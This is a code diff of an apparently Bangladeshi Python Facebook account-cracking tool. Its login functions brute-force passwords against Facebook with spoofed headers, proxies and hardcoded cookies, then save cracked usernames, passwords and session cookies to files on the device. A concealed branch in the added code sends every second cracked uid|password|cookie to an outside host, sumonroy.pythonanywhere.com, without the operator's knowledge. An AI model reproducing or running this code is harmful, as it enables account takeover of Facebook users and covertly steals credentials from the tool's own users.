.simplified.com%252Ffe8330d455a57b530%26relation%3Dopener%26frame%3Dfb96289a58feadea5%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
-            'x-requested-with': 'mark.via.gp',
-            'sec-fetch-site': 'none',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'accept-encoding': 'gzip, deflate, br, zstd',
-            'accept-language': 'en-US,en;q=0.9',}
-            lo = Session.post("https://mbasic.facebook.com/login/Device-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Referer': 'https://www.facebook.com/',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.facebook.com',
+            'DNT': '1',
+            'Alt-Used': 'www.facebook.com',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                print(f" {green}[SUMON-OK] {uid}|{pw}")
-                print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                oks.append(uid+"|"+pw)
-                break
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}|{coki}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
+                    print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                    print(f" {green}Cookie : {green}{coki}")
+                    open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    oks.append(uid)
+                    break
             elif "checkpoint" in log_cookies:
                 if "Enter login code to continue" in log_cookies:
                     print(f" {cyan}[SUMON-2F] {uid}|{pw}")
@@ -1155,7 +1049,7 @@ def freefb(uid, name, pwx, tl):
                     twf.append(uid+"|"+pw)
                     break
                 else:
-                   #print(f" {red}[SUMON-CP] {uid}|{pw}")
+                    #print(f" {red}[SUMON-CP] {uid}|{pw}")
                     open("/sdcard/SUMON_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid+"|"+pw)
                     break
@@ -1331,472 +1225,551 @@ def graph(uid, name, pwx, tl):
     except Exception as e:
         pass     
 
-def UBI_():
-    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-    application_version_code=str(random.randint(000000000,999999999))
-    android_version=str(random.randrange(6,13))
-    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
-    build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
-    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
-    ua1 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Oppo J793V Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/{str(application_version_code)};FBPN/{str(fbs)};FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
-    ua2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; ASUS_X00RD Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1352};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/banglalink;FBMF/asus;FBBD/asus;FBPN/{str(fbs)};FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:;]'
-    ua3 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto z4 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2120};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Verizon;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/moto z4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
-    ua4 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/AT&amp;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
-    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-G973U Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2024};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
-    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/grameenphone;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
-    ua7 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; HUAWEI VNS-L21 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1812};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Vodafone UA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/HUAWEI VNS-L21;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
-    ua8 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; PRA-LX1 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1794};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/AT&amp;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
-    ua9 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; GREEN 2020 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1456};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/robi;FBMF/Green;FBBD/Green;FBPN/{str(fbs)};FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
-    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9])
-
 def mbasic(uid,pwx,tl):
-    global loop
     global oks
     global cps
+    global twf
+    global loop
     global bkas
     sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
+            Session = requests.Session()
+            free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'password': pw,
-            'generate_analytics_claims': '1',
-            'community_id': '',
-            'cpl': 'true',
-            'try_num': '1',
-            'family_device_id': str(uuid.uuid4()),
-            'credentials_type': 'password',
-            'source': 'login',
-            'error_detail_type': 'button_with_disabled',
-            'enroll_misauth': 'false',
-            'generate_session_cookies': '1',
-            'generate_machine_id': '1',
-            'currently_logged_in_userid': '0',
-            'locale': 'en_GB',
-            'client_country_code': 'GB',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',}
+            'login_source': 'comet_headerless_login',
+            'next': '',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTf_7.AWVpDy9HdWE',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',
+            'sfau': 'AYiXwRf6w9LrJM3e68tRDNnP4n9ZudONoMXaOqwgSieQfSkQFBWuauURAUPbdvQU7iCjZGu-1CbA7V4XIDLCdK2eOktmo1ZD_6YIq1HvKK_W584XnARioXs2RjzLcb6lVxvl0kr60PEohZDH76VSXNFn17yVUX7-dkBbzlkOYk7RHaBonBXv5_nGh-xPvH_p5CisjaXz_41Q9fyr8sHPLfPTUjvh1MDdOG5SFgL7BXYwiZ2SzjvyFqYWSmobi7I3ed2QaSACCLJwNrY3fY5KKv4C',
+            'sfiu': 'AYhnD_pdzBJQEE86DsEw4mlSkyBkphy4P5A27esTyrVJBDejQiAdmH9t3Rc13UXt-scXkchI5aWrGAirxl60nddzWjnjYjfW9k53WNx69g4HWaSpFyGdOLuy7_G6eIiTubm32rGUWJouN1pGkJqOtblCc6PQo89kFpGt-zT7JsHdbsw5wOfPNKkAeuEI12mP4Tu9XPTUmd2nEn1XEbv2-fl4pYoLKonvLZ-7TbPeqw-S9cgugfIoH6-gtmvV0gvhRnFpHUVmgW8WNXN49ZixyN-9',}
             headers = {
-            'User-Agent': UBI_(),
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'close',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': 'graph.facebook.com',
-            'X-FB-Net-HNI': str(random.randint(20000,40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type': 'WIFI',
-            'X-Tigon-Is-Retry': 'False',
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-device-group': str(random.randint(2000, 4000)),
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags': 'graphservice',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Server-Cluster': 'True',
-            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
-            url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
-            if "session_key" in result:
-                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                coki = f"sb={sb};{ckkk}"
-                try:
-                    uid = result["uid"]
-                except:
-                    uid = uid
-                c = check_lock(uid)
-                if "live" in c:
-                    if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+            "Host": "www.facebook.com",
+            "content-length": str(len((data))),
+            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="131"',
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+            "x-response-format": "JSONStream",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "viewport-width": "360",
+            "x-requested-with": "XMLHttpRequest",
+            "x-asbd-id": "129477",
+            "dpr": "2",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua-platform": '"Android"',
+            "accept": "*/*",
+            "origin": "https://www.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": 'https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
                     else:
-                        bkas.append(uid)
+                        bkas.append(cid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{uid}|{pw}|{coki}")
+                           statusok = (f"{cid}|{pw}|{coki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                           oks.append(uid)
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
                            break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
                 continue
         loop+=1
-    except net_error:
-        time.sleep(10)
-    except Exception as e:
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
         pass
 
 def p(uid,pwx,tl):
-    global loop
     global oks
     global cps
+    global twf
+    global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
+            Session = requests.Session()
+            free_fb = Session.get('https://touch.facebook.com').text
             data = {
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '2',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
+            'lgnrnd': '104423_iIof',
+            'lgnjs': '1733165065',
             'email': uid,
-            'password': pw,
-            'adid': str(uuid.uuid4()),
-            'device_id': str(uuid.uuid4()),
-            'family_device_id': str(uuid.uuid4()),
-            'session_id': str(uuid.uuid4()),
-            'advertiser_id': str(uuid.uuid4()),
-            'reg_instance': str(uuid.uuid4()),
-            'logged_out_id': str(uuid.uuid4()),
-            'locale': 'en_US',
-            'client_country_code': 'US',
-            'cpl': 'true',
-            'source': 'login',
-            'format': 'json',
-            'omit_response_on_success': 'false',
-            'credentials_type': 'password',
-            'error_detail_type': 'button_with_disabled',
-            'generate_session_cookies': '1',
-            'generate_analytics_claim': '1',
-            'generate_machine_id': '1',
-            'tier': 'regular',
-            'currently_logged_in_userid': '0',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
-            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'api_key': '882a8490361da98702bf97a021ddc14d',
-            'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
+            'prefill_contact_point': uid,
+            'prefill_source': '',
+            'prefill_type': 'contact_point',
+            'first_prefill_source': '',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'false',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqV^%^2F^%^2FAVAAAAFAE',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTf_7.AWVpDy9HdWE',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',
+            'sfau': 'AYiXwRf6w9LrJM3e68tRDNnP4n9ZudONoMXaOqwgSieQfSkQFBWuauURAUPbdvQU7iCjZGu-1CbA7V4XIDLCdK2eOktmo1ZD_6YIq1HvKK_W584XnARioXs2RjzLcb6lVxvl0kr60PEohZDH76VSXNFn17yVUX7-dkBbzlkOYk7RHaBonBXv5_nGh-xPvH_p5CisjaXz_41Q9fyr8sHPLfPTUjvh1MDdOG5SFgL7BXYwiZ2SzjvyFqYWSmobi7I3ed2QaSACCLJwNrY3fY5KKv4C',
+            'sfiu': 'AYhnD_pdzBJQEE86DsEw4mlSkyBkphy4P5A27esTyrVJBDejQiAdmH9t3Rc13UXt-scXkchI5aWrGAirxl60nddzWjnjYjfW9k53WNx69g4HWaSpFyGdOLuy7_G6eIiTubm32rGUWJouN1pGkJqOtblCc6PQo89kFpGt-zT7JsHdbsw5wOfPNKkAeuEI12mP4Tu9XPTUmd2nEn1XEbv2-fl4pYoLKonvLZ-7TbPeqw-S9cgugfIoH6-gtmvV0gvhRnFpHUVmgW8WNXN49ZixyN-9',}
             headers = {
-            'Host': 'graph.facebook.com',
-            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-SIM-HNI': '28255',
-            'X-FB-Net-HNI': '28732',
-            'X-FB-Connection-Bandwidth': '27181576',
-            'X-FB-Connection-Quality': 'EXCELLENT',
-            'X-FB-Connection-Type': 'MOBILE.LTE',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Friendly-Name': 'authenticate',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Content-Length': '1026'}
-            url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
-            if "session_key" in result:
-                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                coki = f"sb={sb};{ckkk}"
-                try:
-                    uid = result["uid"]
-                except:
-                    uid = uid
-                c = check_lock(uid)
-                if "live" in c:
-                    if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+            "Host": "www.facebook.com",
+            "content-length": str(len((data))),
+            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="131"',
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+            "x-response-format": "JSONStream",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "viewport-width": "360",
+            "x-requested-with": "XMLHttpRequest",
+            "x-asbd-id": "129477",
+            "dpr": "2",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua-platform": '"Android"',
+            "accept": "*/*",
+            "origin": "https://www.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": 'https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
                     else:
-                        bkas.append(uid)
+                        bkas.append(cid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{uid}|{pw}|{coki}")
+                           statusok = (f"{cid}|{pw}|{coki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                           oks.append(uid)
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
                            break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
                 continue
         loop+=1
-    except net_error:
-        time.sleep(10)
-    except Exception as e:
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
         pass
 
-
 def x(uid,pwx,tl):
-    global loop
     global oks
     global cps
+    global twf
+    global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M3) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
+            Session = requests.Session()
+            free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
-            'family_device_id': str(uuid.uuid4()),
-            'secure_family_device_id': str(uuid.uuid4()),
-            'cpl': 'true',
-            'try_num': '1',
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
             'email': uid,
-            'password': pw,
-            'method': 'auth.login',
-            'generate_session_cookies': '1',
-            'sim_serials': "['80973453345210784798']",
-            'openid_flow': 'android_login',
-            'openid_provider': 'google',
-            'openid_emails': "['01710940017']",
